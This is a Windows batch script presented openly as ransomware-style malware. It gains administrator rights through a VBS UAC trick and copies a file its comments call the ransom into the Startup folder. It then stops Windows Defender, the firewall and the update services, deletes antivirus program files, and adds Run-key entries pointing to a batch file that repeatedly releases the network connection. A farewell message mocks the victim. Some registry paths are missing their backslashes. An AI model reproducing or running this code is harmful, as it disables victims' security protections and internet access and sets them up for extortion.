:: give admin

set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )




:: Copys ransom to startup

XCOPY "Master.7z" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

COLOR 8A
COLOR 0B
COLOR 1C
COLOR 2D
COLOR 3E
COLOR 4F
COLOR 5F
COLOR 6D
COLOR 7E
COLOR 8A
COLOR 0B
COLOR 1C
COLOR 2D
COLOR 3E
COLOR 4F
COLOR 5F
COLOR 6D
COLOR 7E
COLOR 8A
COLOR 0B
COLOR 1C
COLOR 2D
COLOR 3E
COLOR 4F
COLOR 5F
COLOR 6D
COLOR 7E
COLOR 40
COLOR 8A
COLOR 0B
COLOR 1C
COLOR 2D
COLOR 3E
COLOR 4F
COLOR 5F
COLOR 6D
COLOR 7E
COLOR 8A
COLOR 0B
COLOR 1C
COLOR 2D
COLOR 3E
COLOR 4F
COLOR 5F
COLOR 6D
COLOR 7E
COLOR 8A
COLOR 0B
COLOR 1C
COLOR 2D
COLOR 3E
COLOR 4F
COLOR 5F
COLOR 6D
COLOR 7E
COLOR 40

:: Disable antivirus, firewall, taskmanager, to make sure your not going to get out of this...

net stop "SDRSVC"
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
netsh firewall set opmode mode-disable
net stop "wuauserv"
net stop "Windows Defender Service"
net stop "Windows Firewall"
net stop sharedaccess

del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.dat
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*



COLOR 0F


:: REMOVES INTERNET (Will not let you reconect)

echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo Loading...
echo Tanks you for your coroperation!
echo You have been disconected from the internet and wont be able to reconect for a bit...
PAUSE
@echo off
cls

COLOR 0F
